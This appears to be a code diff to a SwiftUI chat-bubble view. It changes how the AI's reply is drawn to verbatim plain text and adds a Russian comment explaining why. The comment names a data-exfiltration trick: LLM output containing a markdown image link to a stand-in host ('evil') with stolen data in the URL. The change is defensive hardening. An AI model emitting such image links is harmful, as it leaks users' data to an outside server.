@@ -232,7 +232,10 @@ struct AIBubble: View {
     var body: some View {
         VStack(alignment: .leading, spacing: 4) {
             HStack(alignment: .lastTextBaseline, spacing: 2) {
-                Text(text)
+                // Безопасность: рендерим ответ модели как обычную строку.
+                // НЕ заменять на Text(markdown:)/AttributedString — markdown в
+                // тексте от LLM открывает exfiltration через ![](https://evil/?data=…).
+                Text(verbatim: text)
                     .aiType(.body)
                     .foregroundStyle(c.onSurface)
                 if streaming {
